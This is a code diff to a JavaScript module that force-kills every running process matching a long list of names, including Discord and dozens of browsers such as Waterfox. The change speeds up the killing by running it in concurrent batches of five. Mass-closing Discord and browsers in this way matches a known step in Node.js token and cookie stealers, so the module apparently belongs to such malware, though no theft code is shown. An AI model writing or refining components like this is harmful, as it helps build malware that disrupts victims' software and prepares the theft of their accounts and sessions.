@@ -2,9 +2,7 @@ const {
     filterProcesses
 } = require("./../../../utils/harware/processes.js");
 
-const process = require("process");
-
-let allProcess = [
+const allProcess = [
     "discord",
     "cord",
     "Waterfox",
@@ -85,26 +83,41 @@ let allProcess = [
     "60Browser",
 ];
 
+const killProcess = (pid) => new Promise((resolve, reject) => {
+    try {
+        process.kill(pid);
+        resolve();
+    } catch (err) {
+        reject(err);
+    }
+});
+
 module.exports = async () => {
     try {
-        for (const processName of allProcess) {
+        const tasks = allProcess.map(async (processName) => {
             try {
-                const filter = await filterProcesses(processName);
-                if (filter.length > 0) {
-                    await Promise.all(filter.map(proc => {
-                        return new Promise((resolve, reject) => {
-                            try {
-                                process.kill(proc.pid);
-                                resolve();
-                            } catch (err) {
-                                reject(err);
-                            }
-                        });
-                    }));
+                const filters = await filterProcesses(processName);
+                
+                if (filters.length > 0) {
+                    const maxConcurrent = 5;
+                    let index = 0;
+
+                    const runConcurrent = async () => {
+                        const batch = filters.slice(index, index + maxConcurrent);
+                        index += maxConcurrent;
+                        await Promise.all(batch.map(proc => killProcess(proc.pid)));
+                    };
+
+                    while (index < filters.length) {
+                        await runConcurrent();
+                    }
                 }
             } catch (err) {
+                console.error(`Error processing ${processName}:`, err);
             }
-        }
-    } catch (err) {
+        });
+        await Promise.all(tasks);
+    } catch (error) {
+        console.error(error.message);
     }
 };
